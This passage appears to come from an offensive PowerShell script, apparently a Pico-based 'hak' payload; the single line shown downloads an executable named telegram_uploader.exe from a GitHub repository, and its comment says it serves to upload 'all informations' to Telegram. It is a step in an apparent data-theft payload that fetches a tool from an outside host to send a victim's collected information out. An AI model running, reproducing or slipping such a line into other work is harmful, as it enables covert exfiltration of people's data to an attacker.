...
Invoke-WebRequest https://github.com/FBRDCYB3R/Pico_hak/blob/main/telegram_uploader.exe -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
